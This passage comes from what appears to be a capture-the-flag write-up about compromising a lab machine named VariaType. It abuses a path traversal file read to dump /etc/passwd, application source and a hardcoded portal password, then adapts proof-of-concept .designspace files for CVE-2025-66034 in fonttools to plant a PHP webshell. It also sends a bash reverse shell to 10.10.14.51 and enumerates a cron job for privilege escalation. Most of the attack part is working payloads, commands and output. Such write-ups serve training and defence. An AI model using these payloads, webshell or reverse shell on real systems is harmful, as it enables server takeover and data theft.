....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 21ms]
....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 20ms]
....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 21ms]
....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 21ms]
....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 21ms]
:: Progress: [929/929] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

It checks a ton of potential directory traversals, and clearly shows that the `....//` pattern works.

### Filesystem Enumeration

#### Users

I can switch to `curl` using my existing `PHPSESSID` cookie. `/etc/passwd` shows a single user with a home directory in `/home` and that user plus root with shells set:

```console
oxdf@hacky$ curl --path-as-is -s -H 'Host: portal.variatype.htb' -b 'PHPSESSID=ho2h7i774rt7abna4p13vme35b' 'http://portal.variatype.htb/download.php?f=....//....//....//....//....//etc/passwd' | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
steve:x:1000:1000:steve,,,:/home/steve:/bin/bash
```

#### Portal

Guessing at the config file names for the Nginx sites, I’ll find the portal at `/etc/nginx/sites-enabled/portal.variatype.htb`:

```nginx
server {
    listen 80;
    server_name portal.variatype.htb;

    root /var/www/portal.variatype.htb/public;
    index index.php;

    access_log /var/log/nginx/portal_access.log;
    error_log /var/log/nginx/portal_error.log;

    location / {
        try_files $uri $uri/ =404;
    }

    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php-fpm.sock;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }

    location /files/ {
        autoindex off;
    }
}
```

It is hosted from `/var/www/portal.variatype.htb/public`, and uses PHP. This is a good chance to check if this is a file read or file include vulnerability. I’ll grab `var/www/portal.variatype.htb/public/index.php`:

```php
<?php
require_once 'auth.php';

if (isset($_SESSION['user'])) {
    header('Location: /dashboard.php');
    exit();
}

$error = '';
if ($_POST['username'] ?? null) {
    $user = $_POST['username'];
    $pass = $_POST['password'] ?? '';

    if (isset($USERS[$user]) && $USERS[$user] === $pass) {
        $_SESSION['user'] = $user;
        header('Location: /dashboard.php');
        exit();
    } else {
        $error = 'Invalid credentials. Please check your username and password.';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>VariaType — Internal Validation Portal</title>
  <link rel="stylesheet" href="/styles.css">
  <link rel="icon" href="/favicon.ico" type="image/x-icon">
</head>
<body>
  <div class="container">
    <div class="login-box">
      <!-- Logotipo textual corporativo -->
      <div style="text-align: center; margin-bottom: var(--space-5);">
        <h1 style="font-size: 1.5rem; font-weight: 700; color: var(--accent); margin: 0;">VariaType</h1>
        <p class="text-muted" style="font-size: 0.875rem; margin-top: var(--space-2);">
          Typography Integrity & Document Validation Suite
        </p>
      </div>

      <h2>Internal Validation Portal</h2>

      <p class="text-muted" style="margin: var(--space-4) 0 var(--space-6);">
        For authorized personnel only. All access is logged.
      </p>

      <?php if ($error): ?>
        <div style="background: #fff5f5; border: 1px solid var(--error); color: var(--error); padding: var(--space-3); border-radius: var(--radius-md); margin-bottom: var(--space-5); font-size: 0.875rem;">
          <?= htmlspecialchars($error) ?>
        </div>
      <?php endif; ?>

      <form method="POST" novalidate>
        <div class="form-group">
          <label for="username">Employee ID or Username</label>
          <input type="text" id="username" name="username" autocomplete="username" required>
        </div>
        <div class="form-group">
          <label for="password">Password</label>
          <input type="password" id="password" name="password" autocomplete="current-password" required>
        </div>
        <button type="submit" class="btn">Authenticate</button>
      </form>

      <!-- Sección de soporte realista -->
      <div style="margin-top: var(--space-6); padding-top: var(--space-5); border-top: 1px solid var(--divider);">
        <p class="text-muted" style="font-size: 0.8125rem; margin: 0;">
          <strong>Need help?</strong> Contact IT Support at <a href="mailto:it-support@variatype.htb" style="color: var(--primary);">it-support@variatype.internal</a><br>
          Reference: <code style="font-family: var(--font-mono); font-size: 0.75rem;">VT-VALID-2.1.4</code> | Offline Mode: <strong>Enabled</strong>
        </p>
      </div>
    </div>

    <!-- Footer institucional -->
    <div class="footer">
      <p>VariaType Validation Suite © 2025 — All processing occurs locally. No external data transmission.</p>
      <p style="font-size: 0.75rem; color: var(--text-lighter); margin-top: var(--space-2);">
        Unauthorized access is prohibited and will be prosecuted under company policy VT-SEC-017.
      </p>
    </div>
  </div>
</body>
</html>
```

The fact that the PHP at the top is there and not executed shows this is *not* an LFI, but just a file read. That means I won’t be able to get RCE through this vulnerability directly. The users are hard-coded into `auth.php`:

```php
<?php
session_start();

$USERS = [
    'gitbot' => 'G1tB0t_Acc3ss_2025!'
];

function require_login() {
    if (!isset($_SESSION['user'])) {
        header('Location: /');
        exit();
    }
}

function logout() {
    session_destroy();
    header('Location: /');
    exit();
}
?>
```

#### Main Site

The main site is in a config named `variatype.htb` in the same directory as the portal site config:

```nginx
server {
    listen 80 default_server;
    listen [::]:80 default_server;

    server_name _;

    return 301 http://variatype.htb$request_uri;
}

server {
    listen 80;
    server_name variatype.htb;

    access_log /var/log/nginx/variatype_access.log;
    error_log /var/log/nginx/variatype_error.log;

    location / {
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

}
```

This one doesn’t set a directory, but instead proxies requests to port 5000, which makes sense for a Python Flask application.

I want to find the source for the site. I can guess directly, but I’m not able to find it. I’ll look for the service file that runs it, and find it in `/etc/systemd/system/variatype.service`:

```ini
[Unit]
Description=VariaType
After=network.target nginx.service

[Service]
Type=simple
User=variatype
Group=www-data
WorkingDirectory=/opt/variatype
ExecStart=/usr/bin/python3 app.py

Restart=always
RestartSec=10

StandardOutput=journal
StandardError=journal
SyslogIdentifier=variatype

ReadWritePaths=/var/www/portal.variatype.htb/public/files
ReadWritePaths=/opt/variatype

[Install]
WantedBy=multi-user.target
```

The source is located at `/opt/variatype/app.py`:

```python
import os
import tempfile
import subprocess
import shutil
import secrets
from flask import Flask, render_template, request, redirect, url_for, flash, send_file

app = Flask(__name__)
app.secret_key = '7e052f614c5f9d5da3249cc4c6d9a950053aed370b8464d2e8a81d41ff0e3371'

UPLOAD_FOLDER = '/tmp/variabype_uploads'
DOWNLOAD_FOLDER = '/var/www/portal.variatype.htb/public/files'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)

@app.route('/')
def home():
    return render_template('home.html')

@app.route('/services')
def services():
    return render_template('services.html')

@app.route('/tools/variable-font-generator')
def variable_font_generator():
    return render_template('tools/variable_font_generator.html')

@app.route('/tools/variable-font-generator/process', methods=['POST'])
def process_variable_font():
    designspace = request.files.get('designspace')
    master_fonts = request.files.getlist('masters')

    if not designspace or not master_fonts:
        flash('Please upload a .designspace file and at least one master font (.ttf/.otf).', 'error')
        return redirect(url_for('variable_font_generator'))

    if not designspace.filename.endswith('.designspace'):
        flash('The main file must be a valid .designspace document.', 'error')
        return redirect(url_for('variable_font_generator'))

    unique_id = secrets.token_urlsafe(8)
    download_filename = f"variabype_{unique_id}.ttf"
    download_path = os.path.join(DOWNLOAD_FOLDER, download_filename)

    with tempfile.TemporaryDirectory(dir=UPLOAD_FOLDER) as workdir:
        ds_path = os.path.join(workdir, 'config.designspace')
        designspace.save(ds_path)

        for font in master_fonts:
            if font.filename.endswith(('.ttf', '.otf')):
                font.save(os.path.join(workdir, font.filename))
            else:
                flash('Only .ttf and .otf master fonts are supported.', 'error')
                return redirect(url_for('variable_font_generator'))

        try:
            subprocess.run(
                ['fonttools', 'varLib', 'config.designspace'],
                cwd=workdir,
                check=True,
                timeout=30
            )

            output_file = None
            for f in os.listdir(workdir):
                if f != 'config.designspace' and not f.startswith('.'):
                    output_file = f
                    break

            if output_file:
                shutil.copy2(os.path.join(workdir, output_file), download_path)

            return render_template('tools/success.html', download_id=unique_id)

        except subprocess.TimeoutExpired:
            flash('Font generation timed out.', 'error')
            return redirect(url_for('variable_font_generator'))
        except subprocess.CalledProcessError:
            flash('Font generation failed during processing.', 'error')
            return redirect(url_for('variable_font_generator'))
        except Exception:
            flash('An unexpected error occurred.', 'error')
            return redirect(url_for('variable_font_generator'))

@app.route('/download/<download_id>')
def download_file(download_id):
    if not download_id.replace('_', '').replace('-', '').isalnum():
        flash('Invalid download ID.', 'error')
        return redirect(url_for('variable_font_generator'))

    filename = f"variabype_{download_id}.ttf"
    path = os.path.join(DOWNLOAD_FOLDER, filename)

    if os.path.exists(path):
        user_filename = f"MyVariableFont_{download_id}.ttf"
        return send_file(path, as_attachment=True, download_name=user_filename)
    else:
        flash('File not available for download.', 'error')
        return redirect(url_for('variable_font_generator'))
if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False)
```

It defines five routes:

- GET `/` - `home()`
- GET `/services` - `services()`
- GET `/tools/variable-font-generator` - `variable_font_generator()`
- POST `/tools/variable-font-generator/process` - `process_variable_font()`
- GET `/download/<download_id>` - `download_file(download_id)`

The first three GETs just return a template HTML file.

The `/download` route filters to ensure that the id is alphanumeric, before building a path and sending the file if it exists (or if it doesn’t exist, a flash error, which matches with the cookie behavior identified above):

```python
@app.route('/download/<download_id>')
def download_file(download_id):
    if not download_id.replace('_', '').replace('-', '').isalnum():
        flash('Invalid download ID.', 'error')
        return redirect(url_for('variable_font_generator'))

    filename = f"variabype_{download_id}.ttf"
    path = os.path.join(DOWNLOAD_FOLDER, filename)

    if os.path.exists(path):
        user_filename = f"MyVariableFont_{download_id}.ttf"
        return send_file(path, as_attachment=True, download_name=user_filename)
    else:
        flash('File not available for download.', 'error')
        return redirect(url_for('variable_font_generator'))
```

The interesting function is the POST to `process_variable_font()`. It first makes sure that both files are present in the POST:

```python
@app.route('/tools/variable-font-generator/process', methods=['POST'])
def process_variable_font():
    designspace = request.files.get('designspace')
    master_fonts = request.files.getlist('masters')

    if not designspace or not master_fonts:
        flash('Please upload a .designspace file and at least one master font (.ttf/.otf).', 'error')
        return redirect(url_for('variable_font_generator'))

    if not designspace.filename.endswith('.designspace'):
        flash('The main file must be a valid .designspace document.', 'error')
        return redirect(url_for('variable_font_generator'))
...[snip]...
```

Then it creates a download filename / path:

```python
...[snip]...
    unique_id = secrets.token_urlsafe(8)
    download_filename = f"variabype_{unique_id}.ttf"
    download_path = os.path.join(DOWNLOAD_FOLDER, download_filename)
...[snip]...
```

I’ve abused `os.path.join` for this kind of thing in the past (and will again later in this box), but this is not vulnerable because it isn’t using any user-controlled input to build the path.

The rest of the function is taking the input files and using them to create the font:

```python
...[snip]...
    with tempfile.TemporaryDirectory(dir=UPLOAD_FOLDER) as workdir:
        ds_path = os.path.join(workdir, 'config.designspace')
        designspace.save(ds_path)
                                                                                                                                                      for font in master_fonts:
            if font.filename.endswith(('.ttf', '.otf')):
                font.save(os.path.join(workdir, font.filename))
            else:
                flash('Only .ttf and .otf master fonts are supported.', 'error')
                return redirect(url_for('variable_font_generator'))

        try:
            subprocess.run(
                ['fonttools', 'varLib', 'config.designspace'],
                cwd=workdir,
                check=True,
                timeout=30
            )

            output_file = None
            for f in os.listdir(workdir):
                if f != 'config.designspace' and not f.startswith('.'):
                    output_file = f
                    break

            if output_file:
                shutil.copy2(os.path.join(workdir, output_file), download_path)

            return render_template('tools/success.html', download_id=unique_id)

        except subprocess.TimeoutExpired:
            flash('Font generation timed out.', 'error')
            return redirect(url_for('variable_font_generator'))
        except subprocess.CalledProcessError:
            flash('Font generation failed during processing.', 'error')
            return redirect(url_for('variable_font_generator'))
        except Exception:
            flash('An unexpected error occurred.', 'error')
            return redirect(url_for('variable_font_generator'))
...[snip]...
```

The most interesting part is the `subprocess` command that runs `fonttools varLib config.designspace`.

#### fonttools Version

It’s not necessary (as I’ll show below) to find the `fonttools` version, but it is possible. [fonttools](https://github.com/fonttools/fonttools) is a Python tool, which seems to be installed globally. That means it will likely live in `/usr/local/lib/`, and I’ll find it under the `python3.11` directory:

```console
oxdf@hacky$ curl --path-as-is -s -H 'Host: portal.variatype.htb' -b $'PHPSESSID=ho2h7i774rt7abna4p13vme35b' 'http://portal.variatype.htb/download.php?f=....//....//....//....//....//usr/local/lib/python3.11/dist-packages/fontTools/__init__.py'
import logging
from fontTools.misc.loggingTools import configLogger

log = logging.getLogger(__name__)

version = __version__ = "4.50.0"

__all__ = ["version", "log", "configLogger"]
```

It’s running version 4.50.0.

### CVE-2025-66034

#### Identify

The `subprocess` command isn’t something I can inject into, as no user input is used to build the command string. I can look for vulnerabilities in the `fonttools` binary. Searching for “fonttools cve” returns a bunch of references to CVE-2025-66034:

![image-20260607082039069](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260607082039069.png)

#### Background

[CVE-2025-66034](https://nvd.nist.gov/vuln/detail/CVE-2025-66034) is described as:

> fontTools is a library for manipulating fonts, written in Python. In versions from 4.33.0 to before 4.60.2, the fonttools varLib (or python3 -m fontTools.varLib) script has an arbitrary file write vulnerability that leads to remote code execution when a malicious .designspace file is processed. The vulnerability affects the main() code path of fontTools.varLib, used by the fonttools varLib CLI and any code that invokes fontTools.varLib.main(). This issue has been patched in version 4.60.2.

A malicious `.designspace` file can cause `fonttools` to write an arbitrary file. [This advisory](https://github.com/advisories/GHSA-768j-98cg-p3fv) provides more detail, including two POC `.designspace` files. The first shows that I can write to any location by setting the `filename` attribute:

```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
  <axes>
    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400"/>
  </axes>

  <sources>
    <source filename="source-light.ttf" name="Light">
      <location>
        <dimension name="Weight" xvalue="100"/>
      </location>
    </source>
    <source filename="source-regular.ttf" name="Regular">
      <location>
        <dimension name="Weight" xvalue="400"/>
      </location>
    </source>
  </sources>

  <!-- Filename can be arbitrarily set to any path on the filesystem -->
  <variable-fonts>
    <variable-font name="MaliciousFont" filename="../../tmp/newarbitraryfile.json">
      <axis-subsets>
        <axis-subset name="Weight"/>
      </axis-subsets>
    </variable-font>
  </variable-fonts>
</designspace>
```

The second shows writing PHP data inside that file using labels:

```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
  <axes>
  <!-- XML injection occurs in labelname elements with CDATA sections -->
    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
      <labelname xml:lang="en"><![CDATA[<?php echo shell_exec("/usr/bin/touch /tmp/MEOW123");?>]]]]><![CDATA[>]]></labelname>
      <labelname xml:lang="fr">MEOW2</labelname>
    </axis>
  </axes>
  <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400"/>
  <sources>
    <source filename="source-light.ttf" name="Light">
      <location>
        <dimension name="Weight" xvalue="100"/>
      </location>
    </source>
    <source filename="source-regular.ttf" name="Regular">
      <location>
        <dimension name="Weight" xvalue="400"/>
      </location>
    </source>
  </sources>
  <variable-fonts>
    <variable-font name="MyFont" filename="output.ttf">
      <axis-subsets>
        <axis-subset name="Weight"/>
      </axis-subsets>
    </variable-font>
  </variable-fonts>
  <instances>
    <instance name="Display Thin" familyname="MyFont" stylename="Thin">
      <location><dimension name="Weight" xvalue="100"/></location>
      <labelname xml:lang="en">Display Thin</labelname>
    </instance>
  </instances>
</designspace>
```

#### Strategy

I’m going to use the arbitrary file write from CVE-2025-66034 to write a PHP webshell into the portal website’s directory and use that to get execution on the host. There’s actually nothing stopping me from identifying this vulnerability without finding the source or the file read vulnerability in the portal. However, without the file read, I wouldn’t know where on the filesystem to write a file or have a good way to abuse it.

#### Write POC

There are a few modifications to the payload that I’ll need to make, and not much feedback on payloads that don’t work. To get something working, I’ll work slowly and build step by step. First, I want to write an arbitrary file. I’ll use the POC and modify it so that the `sources` block only has the one `.ttf` file that I’m uploading, and the output `filename` is a file in `/tmp`:

```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
  <axes>
    <axis tag="wght" name="Weight" minimum="400" maximum="400" default="400"/>
  </axes>
  <sources>
    <source filename="Super Pandora.ttf" name="Light">
      <location><dimension name="Weight" xvalue="400"/></location>
    </source>
  </sources>
  <variable-fonts>
          <variable-font name="MaliciousFont" filename="/tmp/a.txt">
      <axis-subsets><axis-subset name="Weight"/></axis-subsets>
    </variable-font>
  </variable-fonts>
</designspace>
```

Before uploading, trying to read that file returns a message saying it’s not there:

```console
oxdf@hacky$ curl --path-as-is -s -H 'Host: portal.variatype.htb' -b $'PHPSESSID=ho2h7i774rt7abna4p13vme35b' 'http://portal.variatype.htb/download.php?f=....//....//....//....//....//tmp/a.txt'
File not found.
```

After I upload this plus the matching `.ttf` file, it returns nothing:

```console
oxdf@hacky$ curl --path-as-is -s -H 'Host: portal.variatype.htb' -b $'PHPSESSID=ho2h7i774rt7abna4p13vme35b' 'http://portal.variatype.htb/download.php?f=....//....//....//....//....//tmp/a.txt'
```

`curl` isn’t showing the file because it’s binary, but `-o` will:

```console
oxdf@hacky$ curl --path-as-is -s -H 'Host: portal.variatype.htb' -b $'PHPSESSID=ho2h7i774rt7abna4p13vme35b' 'http://portal.variatype.htb/download.php?f=....//....//....//....//....//tmp/a.txt' -o- | xxd | head
00000000: 0001 0000 0015 0100 0004 0050 4744 4546  ...........PGDEF
00000010: 118e 1154 0002 6bd0 0000 0076 4750 4f53  ...T..k....vGPOS
00000020: 8aac 2d3e 0002 6c48 0000 baf8 4753 5542  ..->..lH....GSUB
00000030: 9751 927c 0003 2740 0000 025c 4856 4152  .Q.|..'@...\HVAR
00000040: 01c6 0025 0003 299c 0000 002a 4f53 2f32  ...%..)....*OS/2
00000050: 4594 033a 0000 01d8 0000 0060 5354 4154  E..:.......`STAT
00000060: 7870 688c 0003 29c8 0000 001c 636d 6170  xph...).....cmap
00000070: 9c24 ba11 0000 0914 0000 0416 6376 7420  .$..........cvt
00000080: 29de 1ebb 0000 1dc8 0000 0066 6670 676d  )..........ffpgm
00000090: 83a5 5c5a 0000 0d2c 0000 0f7f 6676 6172  ..\Z...,....fvar
```

#### Write Content POC

I want more than just an empty file. I’ll update my payload to write content:

```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
  <axes>
  <!-- XML injection occurs in labelname elements with CDATA sections -->
    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
      <labelname xml:lang="en"><![CDATA[0xdf was here]]]]><![CDATA[>]]></labelname>
      <labelname xml:lang="fr">MEOW2</labelname>
    </axis>
  </axes>
  <sources>
    <source filename="Super Pandora.ttf" name="Light">
      <location><dimension name="Weight" xvalue="400"/></location>
    </source>
  </sources>
  <variable-fonts>
          <variable-font name="MaliciousFont" filename="/tmp/b.txt">
      <axis-subsets><axis-subset name="Weight"/></axis-subsets>
    </variable-font>
  </variable-fonts>
  <instances>
    <instance name="Display Thin" familyname="MyFont" stylename="Thin">
      <location><dimension name="Weight" xvalue="100"/></location>
      <labelname xml:lang="en">Display Thin</labelname>
    </instance>
  </instances>
</designspace>
```

I’ve updated the `axes` tag with `labelname` tags like in the second POC, where the stuff I want to inject is in the `CDATA` block. In this case, that’s “0xdf was here”. I’ve also added the `instances` tag to reference the label. I’ve also changed the output filename to `b.txt` just to have a clean location.

When I upload this, my output is there:

```console
oxdf@hacky$ curl --path-as-is -s -H 'Host: portal.variatype.htb' -b $'PHPSESSID=ho2h7i774rt7abna4p13vme35b' 'http://portal.variatype.htb/download.php?f=....//....//....//....//....//tmp/b.txt' -o- | grep -a 0xdf
{Super PandoraRegularSuper Pandora RegularVersion 1.000SuperPandora-Regular0xdf was here]]>ThinMEOW2Super PandoraRegularVersion 1.000;;SuperPandora-Regular;2026;FL842Super Pandora RegularVersion 1.000SuperPandora-Regular0xdf was here]]>ThinMEOW23
```

#### Webshell

I’ll update the payload one last time:

```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
  <axes>
  <!-- XML injection occurs in labelname elements with CDATA sections -->
    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
            <labelname xml:lang="en"><![CDATA[
0xdf output: <?php echo shell_exec($_REQUEST["cmd"]);?>]]]]><![CDATA[>]]></labelname>
      <labelname xml:lang="fr">MEOW2</labelname>
    </axis>
  </axes>
  <sources>
    <source filename="Super Pandora.ttf" name="Light">
      <location><dimension name="Weight" xvalue="400"/></location>
    </source>
  </sources>
  <variable-fonts>
          <variable-font name="MaliciousFont" filename="/var/www/portal.variatype.htb/public/0xdf.php">
      <axis-subsets><axis-subset name="Weight"/></axis-subsets>
    </variable-font>
  </variable-fonts>
  <instances>
    <instance name="Display Thin" familyname="MyFont" stylename="Thin">
      <location><dimension name="Weight" xvalue="100"/></location>
      <labelname xml:lang="en">Display Thin</labelname>
    </instance>
  </instances>
</designspace>
```

I’ve moved the write to the portal directory, and the content to a webshell. Because the output is a large binary file, I’ve included a newline and then a marker so that I can locate the output. When I upload this, it works:

```console
oxdf@hacky$ curl portal.variatype.htb/0xdf.php?cmd=id -s | grep -a 0xdf
0xdf output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Shell

I’ll send a simple [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) to the webshell:

```console
oxdf@hacky$ curl portal.variatype.htb/0xdf.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.51/443 0>&1"'
Warning: Binary output can mess up your terminal. Use "--output -" to tell
Warning: curl to output it to your terminal anyway, or consider "--output
Warning: <FILE>" to save to a file.
```

At my listening `nc`, I get a shell:

```console
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.244.202 44568
bash: cannot set terminal process group (3403): Inappropriate ioctl for device
bash: no job control in this shell
www-data@variatype:~/portal.variatype.htb/public$
```

I’ll upgrade my shell using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```console
www-data@variatype:~/portal.variatype.htb/public$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@variatype:~/portal.variatype.htb/public$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            ‍reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@variatype:~/portal.variatype.htb/public$
```

## Shell as steve

### Enumeration

#### Users

The users with home directories in `/home` matches what I read in `passwd` earlier:

```console
www-data@variatype:/home$ ls
steve
```

www-data can’t access `steve`.

Trying to enumerate `sudo` with `sudo -l` asks for a password.

#### Filesystem

`/opt` has three items:

```console
www-data@variatype:/$ ls /opt/
font-tools  process_client_submissions.bak  variatype
```

`variatype` is the Python source for the main site:

```console
www-data@variatype:/opt/variatype$ ls
app.py  script.py  static  templates
```

`script.py` is not something I found earlier:

```python
import re
import os
from pathlib import Path

project_root = Path("/opt/variatype")

def remove_python_comments(content: str) -> str:
    lines = content.splitlines(keepends=True)
    new_lines = []
    for line in lines:
        if re.match(r"^\s*
            continue
        line = re.sub(r"\s*
        new_lines.append(line)
    return "".join(new_lines)

def remove_html_comments(content: str) -> str:
    return re.sub(r"<!--.*?-->", "", content, flags=re.DOTALL)

for py_file in project_root.rglob("*.py"):
    with open(py_file, "r", encoding="utf-8") as f:
        content = f.read()
    new_content = remove_python_comments(content)
    with open(py_file, "w", encoding="utf-8") as f:
        f.write(new_content)

for html_file in (project_root / "templates").rglob("*.html"):
    with open(html_file, "r", encoding="utf-8") as f:
        content = f.read()
    new_content = remove_html_comments(content)
    with open(html_file, "w", encoding="utf-8") as f:
        f.write(new_content)

print("✅ Comentarios eliminados en archivos .py y .html.")
```

It walks through all the files in `variatype` and removes comments. In fact, it’s broken, presumably because it ran on itself and broke the lines with comment regex. My best guess is that all this code was vibe-coded, and the machine author wanted to strip out all the comments and wrote this script to do so, and forgot to clean it up.

`font-tools` has a Python script as well as an empty directory:

```console
www-data@variatype:/opt/font-tools$ ls
install_validator.py  validators
```

I’ll come back to this later.

#### process_client_submissions.bak

The `process_client_submissions.bak` file is a shell script:

```console
www-data@variatype:/opt$ file process_client_submissions.bak
process_client_submissions.bak: Bourne-Again shell script, ASCII text executable
```

It’s written by Steve Rodriguez, `steve@variatype.htb`, and likely the owner of `/home/steve`:

```bash
#!/bin/bash
#
# Variatype Font Processing Pipeline
# Author: Steve Rodriguez <steve@variatype.htb>
# Only accepts filenames with letters, digits, dots, hyphens, and underscores.
#
...[snip]...
```

It starts by configuring the script to fail on errors, and setting directories / variables and log function:

```bash
...[snip]...
set -euo pipefail

UPLOAD_DIR="/var/www/portal.variatype.htb/public/files"
PROCESSED_DIR="/home/steve/processed_fonts"
QUARANTINE_DIR="/home/steve/quarantine"
LOG_FILE="/home/steve/logs/font_pipeline.log"

mkdir -p "$PROCESSED_DIR" "$QUARANTINE_DIR" "$(dirname "$LOG_FILE")"

log() {
    echo "[$(date --iso-8601=seconds)] $*" >> "$LOG_FILE"
}

cd "$UPLOAD_DIR" || { log "ERROR: Failed to enter upload directory"; exit 1; }

shopt -s nullglob

EXTENSIONS=(
    "*.ttf" "*.otf" "*.woff" "*.woff2"
    "*.zip" "*.tar" "*.tar.gz"
    "*.sfd"
)

SAFE_NAME_REGEX='^[a-zA-Z0-9._-]+$'
...[snip]...
```

Then comes the loop. It effectively uses two for loops to loop over each file in `$UPLOAD_DIR` that ends with any of the extensions in `$EXTENSIONS`:

```bash
...[snip]...
found_any=0
for ext in "${EXTENSIONS[@]}"; do
    for file in $ext; do
        found_any=1
        [[ -f "$file" ]] || continue
        [[ -s "$file" ]] || { log "SKIP (empty): $file"; continue; }

        # Enforce strict naming policy
        if [[ ! "$file" =~ $SAFE_NAME_REGEX ]]; then
            log "QUARANTINE: Filename contains invalid characters: $file"
            mv "$file" "$QUARANTINE_DIR/" 2>/dev/null || true
            continue
        fi

        log "Processing submission: $file"

        if timeout 30 /usr/local/src/fontforge/build/bin/fontforge -lang=py -c "
import fontforge
import sys
try:
    font = fontforge.open('$file')
    family = getattr(font, 'familyname', 'Unknown')
    style = getattr(font, 'fontname', 'Default')
    print(f'INFO: Loaded {family} ({style})', file=sys.stderr)
    font.close()
except Exception as e:
    print(f'ERROR: Failed to process $file: {e}', file=sys.stderr)
    sys.exit(1)
"; then
            log "SUCCESS: Validated $file"
        else
            log "WARNING: FontForge reported issues with $file"
        fi

        mv "$file" "$PROCESSED_DIR/" 2>/dev/null || log "WARNING: Could not move $file"
    done
done

if [[ $found_any -eq 0 ]]; then
    log "No eligible submissions found."
fi
```

For each file, it verifies that the name contains only alphanumeric + dot, underscore, and dash. It then passes the file to `fontforge` with a custom script string that is in-line Python code.

`fontforge` is running version 20230101, which assuming that’s a date, is very old:

```console
www-data@variatype:/$ /usr/local/src/fontforge/build/bin/fontforge --version
Copyright (c) 2000-2025. See AUTHORS for Contributors.
 License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
 with many parts BSD <http://fontforge.org/license.html>. Please read LICENSE.
 Version: 20230101
 Based on sources from 2025-12-07 11:44 UTC-D.
 Based on source from git with hash: a1dad3e81da03d5d5f3c4c1c1b9b5ca5ebcfcecf
fontforge 20230101
build date: 2025-12-07 11:44 UTC
```

#### Processes

I’ll upload [pspy](https://github.com/DominicBreuker/pspy) to VariaType and give it a run. Every two minutes I’ll see a cron running from steve’s home directory:

```console
2026/06/07 13:54:01 CMD: UID=0     PID=56388  | /usr/sbin/CRON -f
2026/06/07 13:54:01 CMD: UID=0     PID=56389  | /usr/sbin/CRON -f
2026/06/07 13:54:01 CMD: UID=1000  PID=56390  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:01 CMD: UID=1000  PID=56391  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:01 CMD: UID=1000  PID=56392  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:01 CMD: UID=1000  PID=56393  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:01 CMD: UID=1000  PID=56394  | timeout 30 /usr/local/src/fontforge/build/bin/fontforge -lang=py -c
import fontforge
import sys
try:
    font = fontforge.open('variabype_2GMzUwWoMk8.ttf')
    family = getattr(font, 'familyname', 'Unknown')
    style = getattr(font, 'fontname', 'Default')
    print(f'INFO: Loaded {family} ({style})', file=sys.stderr)
    font.close()
except Exception as e:
    print(f'ERROR: Failed to process variabype_2GMzUwWoMk8.ttf: {e}', file=sys.stderr)
    sys.exit(1)

2026/06/07 13:54:01 CMD: UID=1000  PID=56395  | timeout 30 /usr/local/src/fontforge/build/bin/fontforge -lang=py -c
import fontforge
import sys
try:
    font = fontforge.open('variabype_2GMzUwWoMk8.ttf')
    family = getattr(font, 'familyname', 'Unknown')
    style = getattr(font, 'fontname', 'Default')
    print(f'INFO: Loaded {family} ({style})', file=sys.stderr)
    font.close()
except Exception as e:
    print(f'ERROR: Failed to process variabype_2GMzUwWoMk8.ttf: {e}', file=sys.stderr)
    sys.exit(1)

2026/06/07 13:54:01 CMD: UID=1000  PID=56396  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:01 CMD: UID=1000  PID=56397  |
2026/06/07 13:54:01 CMD: UID=1000  PID=56398  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:01 CMD: UID=1000  PID=56399  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:01 CMD: UID=1000  PID=56400  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:01 CMD: UID=1000  PID=56401  |
